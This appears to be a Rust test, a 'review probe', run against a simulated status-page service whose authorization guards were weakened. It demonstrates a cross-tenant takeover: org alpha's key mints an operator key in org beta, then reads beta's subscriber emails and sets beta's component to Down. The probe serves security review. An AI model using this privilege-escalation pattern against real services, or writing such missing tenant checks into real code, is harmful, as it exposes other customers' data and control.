//! Review probe: what the removed/weakened guards in this copy hand alpha's operator.
use charpente::http::{Method, Request};
use charpente::kernel::{Kernel, SimSource};
use charpente_sim::{FaultConfig, Sim};
use serde_json::{Value, json};

const SEC: u64 = 1_000_000_000;

fn send(sim: &Sim, k: &mut Kernel, req: Request) -> (u16, Value) {
    let at = sim.now().as_nanos() + SEC;
    let mut src = SimSource::new(Box::new(sim.clock()), at + SEC);
    src.push_at(at, req);
    let r = src.responses();
    k.run(&mut src).unwrap();
    let (s, b) = r.lock().unwrap().first().cloned().unwrap();
    (s, serde_json::from_slice(&b).unwrap_or(Value::Null))
}
fn key(r: Request, k: &str) -> Request { r.header("authorization", format!("Bearer {k}")) }

#[test]
fn alpha_takes_over_beta() {
    let sim = Sim::with_faults(11, FaultConfig::none());
    let app = statuspage::build_app(Box::new(sim.disk()), Box::new(sim.entropy())).unwrap();
    let mut k = Kernel::new(app, Box::new(sim.clock())).unwrap();
    let (_, a) = send(&sim, &mut k, Request::new(Method::Post, "/orgs").json(&json!({"name":"alpha","operator":"a"})));
    let (_, b) = send(&sim, &mut k, Request::new(Method::Post, "/orgs").json(&json!({"name":"beta","operator":"b"})));
    let (akey, borg, bkey) = (a["api_key"].as_str().unwrap().to_string(), b["org"].as_str().unwrap().to_string(), b["api_key"].as_str().unwrap().to_string());
    let (_, c) = send(&sim, &mut k, key(Request::new(Method::Post, format!("/orgs/{borg}/components")).json(&json!({"name":"db","status":"Operational"})), &bkey));
    let comp = c["id"].as_str().unwrap().to_string();
    send(&sim, &mut k, Request::new(Method::Post, format!("/orgs/{borg}/subscribe")).json(&json!({"email":"cfo@beta.test"})));
    let (s, minted) = send(&sim, &mut k, key(Request::new(Method::Post, format!("/orgs/{borg}/operators")).json(&json!({"name":"mallory"})), &akey));
    println!("alpha's key -> POST /orgs/beta/operators: {s} {minted}");
    let stolen = minted["api_key"].as_str().unwrap().to_string();
    let (s, subs) = send(&sim, &mut k, key(Request::new(Method::Get, format!("/orgs/{borg}/subscriptions")), &stolen));
    println!("minted key -> GET /orgs/beta/subscriptions: {s} {subs}");
    let (s, st) = send(&sim, &mut k, key(Request::new(Method::Put, format!("/orgs/{borg}/components/{comp}/status")).json(&json!({"status":"Down"})), &akey));
    println!("alpha's key -> PUT beta component status: {s} {st}");
    assert_eq!(s, 200);
}
